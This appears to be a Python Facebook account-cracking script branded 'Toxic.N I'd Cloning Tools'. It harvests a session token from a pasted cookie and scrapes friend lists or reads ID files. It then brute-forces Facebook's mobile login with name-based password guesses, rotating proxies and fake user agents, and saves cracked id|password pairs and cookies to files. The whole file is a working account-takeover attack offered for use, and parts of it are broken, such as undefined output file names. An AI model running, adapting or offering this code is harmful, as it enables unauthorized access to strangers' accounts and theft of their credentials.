#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('prox.txt','w').write(prox) 
except Exception as e:
	print('\x1b[1;97m\x1b[1;96m\x1b[1;92m \x1b[1;96m[\x1b[1;91m[MX')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/9/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;97m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[1;97m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;97m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([P,m,H,N,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;97mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _MAMUN_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║                                                   ║
\x1b[97;1m  ║ ████████  ██████  ██   ██ ██  ██████    ███    ██ ║
\x1b[97;1m  ║    ██    ██    ██  ██ ██  ██ ██         ████   ██ ║
\x1b[97;1m  ║    ██    ██    ██   ███   ██ ██         ██ ██  ██ ║
\x1b[97;1m  ║    ██    ██    ██  ██ ██  ██ ██         ██  ██ ██ ║
\x1b[97;1m  ║    ██     ██████  ██   ██ ██  ██████ \x1b[91;1m██ \x1b[97;1m██   ████ ║
\x1b[97;1m  ║                                                   ║
\x1b[97;1m  ╠═══════════════════════════════════════════════════╣ 
\x1b[97;1m  ║      [\x1b[91;1m+\x1b[97;1m] \x1b[97;1mToxic.N I'd Cloning Tools\x1b[97;1m  [\x1b[91;1m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\x1b[91;1mo00\x1b[97;1m═════════════\x1b[91;1m〄\x1b[97;1m═══════════\x1b[91;1m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\x1b[91;1m•\x1b[97;1m] \033[1;31mName     : \x1b[97;1mToxic.N I'd Cloning Tools          \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\x1b[91;1m•\x1b[97;1m] \033[1;31mGithub   : \x1b[97;1mhttps://github.com/Toxic-N-404     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\x1b[91;1m•\x1b[97;1m] \033[1;31mWhatsapp : \x1b[97;1m+88016********                     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\x1b[91;1m•\x1b[97;1m] \033[1;31mVersion  : \x1b[97;1m1.2.0\x1b[1;94m	                      \x1b[97;1m║      
\x1b[97;1m  ╠═════════\x1b[91;1mo00\x1b[97;1m═════════════\x1b[91;1m〄\x1b[97;1m═══════════\x1b[91;1m00o\x1b[97;1m══════════╣""")
os.system('clear')
banner()
#os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_MX_WORLD.mp3")
print(f' \x1b[1;97m==|>\x1b[1;97mWHAT IS YOUR NAME')
MAMUN_NAME=input(f' \x1b[1;97m==|>\x1b[1;97mYOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' \x1b[1;97m==|>\x1b[1;97mCHECK YOUR INTERNET THEN TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		cookie=input(f' \x1b[1;97m==|>\x1b[1;97m [+] INPUT COOKIES :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f' \x1b[1;97m:\x1b[1;97mLOGIN SUCCESSFUL \n\x1b[1;97m==|>\x1b[1;97mTYPE \x1b[1;96mpython T-F.py');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'\x1b[1;97m==|>\x1b[1;97mERROR BRO CHECK YOUR COOKIES ID')
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('\x1b[1;97m==|>Cookies Expired ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	_MAMUN_(f'\x1b[1;97m╔══════════════════════════════════════════════════════╗')
	_MAMUN_(f'\x1b[1;97m║        ( PREMIUM USER INFORMATION )                  \x1b[1;97m║ ')
	_MAMUN_(f'\x1b[1;97m╠══════════════════════════════════════════════════════╝')
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97mYOUR NAME\x1b[1;97m    :\x1b[1;97m '+str(MAMUN_NAME)) 
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97mYOUR ID NAME\x1b[1;97m :\x1b[1;97m {my_name}')
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97mCLONING DATE\x1b[1;97m : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta}')
	_MAMUN_(f"\x1b[1;97m║\x1b[1;97mCLONING TIME\x1b[1;97m : \x1b[1;97m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97mYOUR ID\x1b[1;97m      :\x1b[1;97m '+str(my_id))
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97mYOUR IP\x1b[1;97m      : \x1b[1;97m{ip}                         ')
	_MAMUN_(f'\x1b[1;97m╠══════════════════════════════════════════════════════╗')
	_MAMUN_(f'\x1b[1;97m║\x1b[1;97m==|>CRACK METHOD  ')
	_MAMUN_(f'\x1b[1;97m║[\x1b[1;92m1\x1b[1;97m]\x1b[1;97m FILE CRACK')
	_MAMUN_(f'\x1b[1;97m║[\x1b[1;92m2\x1b[1;97m]\x1b[1;97m CONTACT ME')
	_MAMUN_(f'\x1b[1;97m║[\x1b[1;92m0\x1b[1;97m]\x1b[1;97m LOGOUT COOKIE & EXIT')
	_____MAMUN_____ = input('\x1b[1;97m║==|>Choose :\x1b[1;92m')
	if _____MAMUN_____ in ['1']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		F()
	if _____MAMUN_____ in ['2']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
	if _____MAMUN_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('\x1b[1;97m║==|>LogOut Successful ')
		exit()
	else:
		print('\x1b[1;97m║==|>Successful Bra 🥳 ')
		back()
def error():
	print(f'\x1b[1;97m║==|>SORRY, PLZ CHOOSE THE RIGHT MENU')
	time.sleep(2)
	back()
	
def P():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m║==|>Target Id Limit : \x1b[1;92m'))
	except ValueError:
		print('\x1b[1;97m║==|>WRONG TYPE ')
		exit()
	if jum<1 or jum>100:
		print('\x1b[1;97m║==|>Wrong Type  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(h+'\x1b[1;97m║==|>ENTER PUBLIC ID\x1b[1;97m[\x1b[1;92m'+str(yz)+'\x1b[1;97m]\x1b[1;92m: \x1b[1;96m')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('\x1b[1;97m║==|>CHECK YOUR INTERNET CONNECTION BRUH')
			exit()
	try:
		print(f'\x1b[1;97m║==|>TOTAL ID : \x1b[1;97m'+str(len(id)))
		Settings()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print('\x1b[1;97m║==|>CHECK YOUR INTERNET CONNECTION BRUH')
		back()
	except (KeyError,IOError):
		print(f'\x1b[1;97m║==|>Your Id Maybe Not Public\n\x1b[1;97m║==|>Check Your Id\n\x1b[1;97m║==|>Then Try Again')
		print(f'\x1b[1;97m╚══════════════════════════════════════════════════════╝')
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print()
			print('\x1b[1;97m╔══════════════════════════════════════════════════════\x1b[1;97m╗')
			print(f'\x1b[1;97m║==|>Example:\x1b[93;1m/sdcard/Toxic.txt')
			fileX = input ('\x1b[1;97m║==|>ENTER YOUR FILE :\x1b[93;1m') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;97m║==|>TOTAL ID : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\x1b[1;97m║==|>FILE %s NOT FOUND\x1b[1;97m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f'\x1b[1;97m║==|>\x1b[1;97m[\x1b[1;92m1\x1b[1;97m]CLONE ONLY MIX ID')
	hu = input('\x1b[1;97m║==|>CHOOSE : \x1b[1;97m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\x1b[1;97m║WRONG OPTION BARA')
		exit()
	
	print(f'\x1b[1;97m║==|>[\x1b[1;92m1\x1b[1;97m]\x1b[1;97mMOBILE ')
	hc = input('\x1b[1;97m║==|>CHOOSE :\x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\x1b[1;97m║==|>PASSWORD MENU \033[40m\033[00m\n\x1b[1;97m║==|>PASSWORD \x1b[1;97m[\x1b[1;92mm\x1b[1;97m]\n\x1b[1;97m║==|>PASSWORD \x1b[1;97m[\x1b[1;92md\x1b[1;97m] \x1b[1;92m\n\x1b[1;97m║==|>Choose : \x1b[1;97m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'\x1b[1;97m║Add Password Manual Minimam \x1b[1;93m6\x1b[1;97m Character')
		pwku=input('\x1b[1;97m║==|>Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\x1b[1;97m╠══════════════════════════════════════════════════════╗ ')
	print(f"\x1b[1;97m║==|>[√] YOUR NAME         : \x1b[1;97m"+str(MAMUN_NAME)) 
	print(f"\x1b[1;97m║==|>[√] TOTAL ID          : \x1b[1;97m"+str(len(id)))
	print(f"\x1b[1;97m║==|>[√] TODAY TIME        : \x1b[1;97m"+str(a)+":"+str(lt()[4])+" "+ tag+"                   \x1b[1;97m║")
	print(f"\x1b[1;97m║==|>[√] TODAY DATE        : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta}                  \x1b[1;97m║")
	print(f"\x1b[1;97m║==|>[√] NOTE : \x1b[1;94m[ USE AIRPLANE MODE BEFORE USE ]       \x1b[1;97m║")
	print(f'\x1b[1;97m╚══════════════════════════════════════════════════════╝\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf+'@@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(nmf+'###')
					pwv.append(frs+'khan')
					pwv.append(frs+'khan123')
					pwv.append(frs+'khan1234')
					pwv.append(nmf+'khan12345')
					pwv.append(nmf+'khan@@@')
					pwv.append(nmf+'khan@123')
					pwv.append(nmf+'@123')
					pwv.append(nmf+'@khan')
					pwv.append(nmf+'#123')
					pwv.append(nmf+'#1234')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(nmf+'###')
					pwv.append(frs+'khan')
					pwv.append(frs+'khan123')
					pwv.append(frs+'khan1234')
					pwv.append(nmf+'khan12345')
					pwv.append(nmf+'khan@@@')
					pwv.append(nmf+'khan@123')
					pwv.append(nmf+'@123')
					pwv.append(nmf+'@khan')
					pwv.append(nmf+'#123')
					pwv.append(nmf+'#1234')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f'\x1b[1;97m║==|>CRACK COMPLETE ')
	print(f'\x1b[1;97m║==|>OK : {h}%s '%(ok))
	print(f'\x1b[1;97m║==|>Main Manu \x1b[1;92m[Y]\n\x1b[1;97m║==|>\x1b[1;97mExit [\x1b[1;92mT\x1b[1;97m]')
	woi = input(f'\x1b[1;97m║==|>Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \x1b[1;97m==|>Allah Hafiz Bro {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [Toxic] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;97m[Toxic-CP] [💔] {idf} | {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n [Toxic-OK] [🔥] {idf} | {pw}\n [🍪]COOKIES : {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def RMX():
  os.system('clear')
  banner()
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "√".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Toxic-N-404/TX-N/blob/main/Approval.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      time.sleep(0.3)
      login()
      pass
    else:
      print('\x1b[1;97m┏─────────────────────────────────────────┓')
      print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97mThis Is Paid Tools Enjoy 💚')
      print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97mYOUR KEY :\x1b[1;92m Toxic='+id)
      print('\x1b[1;97m┗─────────────────────────────────────────┛')
      os.system('')
      time.sleep(3)
      sys.exit()
  except:
      sys.exit()
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    RMX()

